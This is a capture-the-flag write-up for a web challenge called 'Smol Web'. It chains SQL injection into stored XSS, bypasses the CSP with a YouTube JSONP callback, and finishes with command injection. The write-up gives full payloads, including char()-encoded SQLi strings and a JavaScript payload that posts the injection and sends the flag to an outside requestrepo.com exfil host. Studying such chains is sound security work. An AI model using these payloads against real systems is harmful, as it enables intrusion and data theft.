#### Smol Web
- points earned: 168
#### Notes / Intuition
- I'll split this out into multiple sections where the first section (this one) will contain the basic exploit chain.  The following sections will contain the problems that need to be solved along the way.  And the final sections will be the actual solution and payload creation.
- There is a command execuction vulnerability in the `/search` route.
	```python
	cmd = f"find {FILES_DIR} {sanitized_payload}"
	```
	- The sanitizer is:
		- blocking some keywords `'cc'`, `'gcc '`, `'ex '`, and  `'sleep '`
		- blocking some characters `[<>mhnpdvq$srl+%kowatf123456789'^@"\\]`
		- and removing some characters `[;&|$\(\)\[\]<>]`
	- `/search` is a localhost only route, so I'll need to find an XSS that I can deliver to the bot.
- There's an opportunity for XSS to occur on the `ratings_page.html` template.  `|safe` is used which tells jinja not to encode html characters.
	```html
	<td class="py-2">{{ product.creator|safe }}</td>
	```
- There are 2 sql queries that lead to the population of `product.creator`.  In the `/rating` route:
	```python
	sql = f"SELECT id, name, description, user_id FROM products WHERE quantity = {quantity}"
	# and
	user_q = f"SELECT id, name FROM users WHERE id = {r['user_id']}"
	```
	-  `user_id` in the second query is from the `user_id` that comes from the first query
	- If the second query is something like `SELECT id, name FROM users WHERE id = 1 union select 2,'<script>alert(1)</script>'` then this will get placed into the dom and cause an XSS.
	- This can happen if the first query is something like `SELECT id, name, description, user_id FROM products WHERE quantity = 7 union select 1,2,3,'1 union select 2,"<script>alert(1)</script>"`
	- See below for notes on `CSP`

##### Problem: the first sql query are filtered for `'`, `"`, and `\\`
- I solved this problem by formatting my strings like `char(65,65,65,65)`
##### Problem: there is a maximum number of arguments that the sql `char()` function will accept
- I solved this by splitting my `char(65,65,65,65)` calls into something like `char(65,65)||char(65,65)`
##### Problem: the input filters on `/search`
- I spent a bit of time playing in the shell to confirm that I can use a command `/?e*g*b*` to execute the `/readflagbinary` executable.
- to inject into the `find {FILES_DIR} {sanitized_payload}` command I can use a newline `e\n/?e*g*b*` (`;` in filtered)
- so the POST body below will suffice
```http
search=e
/?e*g*b*
```

##### Problem: CSP on `/ratings` prevents inline javascript
- `script-src 'self' https://cdn.tailwindcss.com https://www.youtube.com;`
- In this situation I'm looking for a gadget that I can use to serve javascript in the application or one of the hosts provided to the CSP.
- I did not find any gadgets in the application.
- I put the csp into https://cspbypass.com/ and found the following which worked
	```html
	<script src="https://www.youtube.com/oembed?callback=alert(1)"></script>
	```

##### Problem: CSP on `/ratings` prevents `fetch()` calls to a cross origin exfil server
- just use `location=http://exfilServer/<dataToExfile>` in my XSS

#### Solution
- At a high level:
	- Exploit sql injection chain such that XSS gets loaded into the `product.creator` field for `ratings_page.html`.
	- Craft XSS that sends a post to `/search` to exploit command injection.

##### Creating the payload & Walking through the exploit
- the payload
```js
(async function() {
	r = await fetch( '/search',
		{
			method: 'post',
			headers: {
				'Content-Type': 'application/x-www-form-urlencoded'
			},
			body: 'search=e%0a/?e*g*b*'
		}
	);
	t = await r.text();
	flag = t.match(/0xL4ugh{(.*?)}/gi)[0];
	location=`https://m5keli1g.requestrepo.com/${flag}`;
})();
```
- remove the newlines and url encode
```
%28async%20function%28%29%20%7Br%20%3D%20await%20fetch%28%27%2Fsearch%27%2C%20%7B%20method%3A%20%27post%27%2C%20headers%3A%20%7B%20%27Content%2DType%27%3A%20%27application%2Fx%2Dwww%2Dform%2Durlencoded%27%20%7D%2C%20body%3A%20%27search%3De%250a%2F%3Fe%2Ag%2Ab%2A%27%20%7D%29%3Bt%20%3D%20await%20r%2Etext%28%29%3Bflag%20%3D%20t%2Ematch%28%2F0xL4ugh%7B%28%2E%2A%3F%29%7D%2Fgi%29%5B0%5D%3Blocation%3D%60https%3A%2F%2Fm5keli1g%2Erequestrepo%2Ecom%2F%24%7Bflag%7D%60%3B%7D%29%28%29%3B
```
- put that into some sqli and convert to ascii
```
99 union select 9,"<script>...</script>"
```

```
print(','.join([str(ord(c)) for c in '99 union select 9,"<script src=""https://www.youtube.com/oembed?callback=%28async%20function%28%29%20%7Br%20%3D%20await%20f\  
etch%28%27%2Fsearch%27%2C%20%7B%20method%3A%20%27post%27%2C%20headers%3A%20%7B%20%27Content%2DType%27%3A%20%27application%2Fx%2Dwww%2Dform%2Durlencoded%27%20%7D%2C%2\  
0body%3A%20%27search%3De%250a%2F%3Fe%2Ag%2Ab%2A%27%20%7D%29%3Bt%20%3D%20await%20r%2Etext%28%29%3Bflag%20%3D%20t%2Ematch%28%2F0xL4ugh%7B%28%2E%2A%3F%29%7D%2Fgi%29%5B0\  
%5D%3Blocation%3D%60https%3A%2F%2Fm5keli1g%2Erequestrepo%2Ecom%2F%24%7Bflag%7D%60%3B%7D%29%28%29%3B""></script>"']))
```

```
57,57,32,117,110,105,111,110,32,115,101,108,101,99,116,32,57,44,34,60,115,99,114,105,112,116,32,115,114,99,61,34,34,104,116,116,112,115,58,47,47,119,119,119,46,121,11  
1,117,116,117,98,101,46,99,111,109,47,111,101,109,98,101,100,63,99,97,108,108,98,97,99,107,61,37,50,56,97,115,121,110,99,37,50,48,102,117,110,99,116,105,111,110,37,50  
,56,37,50,57,37,50,48,37,55,66,114,37,50,48,37,51,68,37,50,48,97,119,97,105,116,37,50,48,102,101,116,99,104,37,50,56,37,50,55,37,50,70,115,101,97,114,99,104,37,50,55,  
37,50,67,37,50,48,37,55,66,37,50,48,109,101,116,104,111,100,37,51,65,37,50,48,37,50,55,112,111,115,116,37,50,55,37,50,67,37,50,48,104,101,97,100,101,114,115,37,51,65,  
37,50,48,37,55,66,37,50,48,37,50,55,67,111,110,116,101,110,116,37,50,68,84,121,112,101,37,50,55,37,51,65,37,50,48,37,50,55,97,112,112,108,105,99,97,116,105,111,110,37  
,50,70,120,37,50,68,119,119,119,37,50,68,102,111,114,109,37,50,68,117,114,108,101,110,99,111,100,101,100,37,50,55,37,50,48,37,55,68,37,50,67,37,50,48,98,111,100,121,3  
7,51,65,37,50,48,37,50,55,115,101,97,114,99,104,37,51,68,101,37,50,53,48,97,37,50,70,37,51,70,101,37,50,65,103,37,50,65,98,37,50,65,37,50,55,37,50,48,37,55,68,37,50,5  
7,37,51,66,116,37,50,48,37,51,68,37,50,48,97,119,97,105,116,37,50,48,114,37,50,69,116,101,120,116,37,50,56,37,50,57,37,51,66,102,108,97,103,37,50,48,37,51,68,37,50,48  
,116,37,50,69,109,97,116,99,104,37,50,56,37,50,70,48,120,76,52,117,103,104,37,55,66,37,50,56,37,50,69,37,50,65,37,51,70,37,50,57,37,55,68,37,50,70,103,105,37,50,57,37  
,53,66,48,37,53,68,37,51,66,108,111,99,97,116,105,111,110,37,51,68,37,54,48,104,116,116,112,115,37,51,65,37,50,70,37,50,70,109,53,107,101,108,105,49,103,37,50,69,114,  
101,113,117,101,115,116,114,101,112,111,37,50,69,99,111,109,37,50,70,37,50,52,37,55,66,102,108,97,103,37,55,68,37,54,48,37,51,66,37,55,68,37,50,57,37,50,56,37,50,57,3  
7,51,66,34,34,62,60,47,115,99,114,105,112,116,62,34
```
- put that into another layer of sqli and url encode
```
7 union select 1,2,3,char(..ascii..)||char(..ascii..)||char(..ascii..)||char(..ascii..)
```

```
7%20union%20select%201%2C2%2C3%2Cchar%2857%2C57%2C32%2C117%2C110%2C105%2C111%2C110%2C32%2C115%2C101%2C108%2C101%2C99%2C116%2C32%2C57%2C44%2C34%2C60%2C115%2C99%2C114%2C105%2C112%2C116%2C32%2C115%2C114%2C99%2C61%2C34%2C34%2C104%2C116%2C116%2C112%2C115%2C58%2C47%2C47%2C119%29%7C%7Cchar%28119%2C119%2C46%2C121%2C111%2C117%2C116%2C117%2C98%2C101%2C46%2C99%2C111%2C109%2C47%2C111%2C101%2C109%2C98%2C101%2C100%2C63%2C99%2C97%2C108%2C108%2C98%2C97%2C99%2C107%2C61%2C37%2C50%2C56%2C97%2C115%2C121%2C110%2C99%2C37%2C50%2C48%2C102%2C117%2C110%2C99%2C116%2C105%2C111%2C110%2C37%2C50%2C56%2C37%2C50%2C57%2C37%2C50%2C48%2C37%2C55%2C66%29%7C%7Cchar%28114%2C37%2C50%2C48%2C37%2C51%2C68%2C37%2C50%2C48%2C97%2C119%2C97%2C105%2C116%2C37%2C50%2C48%2C102%2C101%2C116%2C99%2C104%2C37%2C50%2C56%2C37%2C50%2C55%2C37%2C50%2C70%2C115%2C101%2C97%2C114%2C99%2C104%2C37%2C50%2C55%2C37%2C50%2C67%2C37%2C50%2C48%2C37%2C55%2C66%2C37%2C50%2C48%2C109%2C101%2C116%2C104%2C111%2C100%2C37%2C51%2C65%2C37%2C50%2C48%2C37%29%7C%7Cchar%2850%2C55%2C112%2C111%2C115%2C116%2C37%2C50%2C55%2C37%2C50%2C67%2C37%2C50%2C48%2C104%2C101%2C97%2C100%2C101%2C114%2C115%2C37%2C51%2C65%2C37%2C50%2C48%2C37%2C55%2C66%2C37%2C50%2C48%2C37%2C50%2C55%2C67%2C111%2C110%2C116%2C101%2C110%2C116%2C37%2C50%2C68%2C84%2C121%2C112%2C101%2C37%2C50%2C55%2C37%2C51%2C65%2C37%2C50%2C48%2C37%2C50%2C55%2C97%2C112%29%7C%7Cchar%28112%2C108%2C105%2C99%2C97%2C116%2C105%2C111%2C110%2C37%2C50%2C70%2C120%2C37%2C50%2C68%2C119%2C119%2C119%2C37%2C50%2C68%2C102%2C111%2C114%2C109%2C37%2C50%2C68%2C117%2C114%2C108%2C101%2C110%2C99%2C111%2C100%2C101%2C100%2C37%2C50%2C55%2C37%2C50%2C48%2C37%2C55%2C68%2C37%2C50%2C67%2C37%2C50%2C48%2C98%2C111%2C100%2C121%2C37%2C51%2C65%2C37%2C50%29%7C%7Cchar%2848%2C37%2C50%2C55%2C115%2C101%2C97%2C114%2C99%2C104%2C37%2C51%2C68%2C101%2C37%2C50%2C53%2C48%2C97%2C37%2C50%2C70%2C37%2C51%2C70%2C101%2C37%2C50%2C65%2C103%2C37%2C50%2C65%2C98%2C37%2C50%2C65%2C37%2C50%2C55%2C37%2C50%2C48%2C37%2C55%2C68%2C37%2C50%2C57%2C37%2C51%2C66%2C116%2C37%2C50%2C48%2C37%2C51%2C68%2C37%2C50%2C48%2C97%2C119%2C97%2C105%2C116%2C37%29%7C%7Cchar%2850%2C48%2C114%2C37%2C50%2C69%2C116%2C101%2C120%2C116%2C37%2C50%2C56%2C37%2C50%2C57%2C37%2C51%2C66%2C102%2C108%2C97%2C103%2C37%2C50%2C48%2C37%2C51%2C68%2C37%2C50%2C48%2C116%2C37%2C50%2C69%2C109%2C97%2C116%2C99%2C104%2C37%2C50%2C56%2C37%2C50%2C70%2C48%2C120%2C76%2C52%2C117%2C103%2C104%2C37%2C55%2C66%2C37%2C50%2C56%2C37%2C50%2C69%2C37%2C50%2C65%2C37%29%7C%7Cchar%2851%2C70%2C37%2C50%2C57%2C37%2C55%2C68%2C37%2C50%2C70%2C103%2C105%2C37%2C50%2C57%2C37%2C53%2C66%2C48%2C37%2C53%2C68%2C37%2C51%2C66%2C108%2C111%2C99%2C97%2C116%2C105%2C111%2C110%2C37%2C51%2C68%2C37%2C54%2C48%2C104%2C116%2C116%2C112%2C115%2C37%2C51%2C65%2C37%2C50%2C70%2C37%2C50%2C70%2C109%2C53%2C107%2C101%2C108%2C105%2C49%2C103%2C37%2C50%2C69%29%7C%7Cchar%28114%2C101%2C113%2C117%2C101%2C115%2C116%2C114%2C101%2C112%2C111%2C37%2C50%2C69%2C99%2C111%2C109%2C37%2C50%2C70%2C37%2C50%2C52%2C37%2C55%2C66%2C102%2C108%2C97%2C103%29%7C%7Cchar%2837%2C55%2C68%2C37%2C54%2C48%2C37%2C51%2C66%2C37%2C55%2C68%2C37%2C50%2C57%2C37%2C50%2C56%2C37%2C50%2C57%2C37%2C51%2C66%2C34%2C34%2C62%2C60%2C47%2C115%2C99%2C114%2C105%2C112%2C116%2C62%2C34%29
```

- create url for bot and sent it to `/report`
```
POST /report HTTP/1.1
Host: challenges3.ctf.sd:33193

url=ratings?quantity=7%20union%20select%201%2C2%2C3%2Cchar%2857%2C57%2C32%...TRUNCATED
```
- The bot goes to ratings
- first query
```sql
SELECT id, name, description, user_id FROM products WHERE quantity = 7 union select 1,2,3,char(..ascii..)||char(..ascii..)||char(..ascii..)||char(..ascii..)
```
- the result contains something like
```
1,2,3,print(','.join([str(ord(c)) for c in '99 union select 9,"<script src=""https://www...TRUNCATED
```
- second query
```sql
SELECT id, name FROM users WHERE id = 99 union select 9,"<script src=""https://www...TRUNCATED
```
- the result is something like
```
9,<script src=""https://www.youtube.com/oembed?callback=%28async%20function%28%...TRUNCATED
```
- the `<script>` gets sent to `ratings_page.html` as `product.creator`
- which gets rendered because of `<td class="py-2">{{ product.creator|safe }}</td>`
- This triggers the youtube XSS payload
- which sends a POST to `/search` with body `search=e%0a/?e*g*b*`
- the `/search` endpoint sanitizes the search param and places it in a string for execution
```py
cmd = f"find {FILES_DIR} {sanitized_payload}"
print(f"[DEBUG] Executing command: {cmd}")
result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
```
- the command ends up looking like
```bash
find ./uploads e
/?e*g*b*
```
- which executes `/readflagbinary` reading the flag and sending it back in the response
- js parses the flag, and sends it to exfil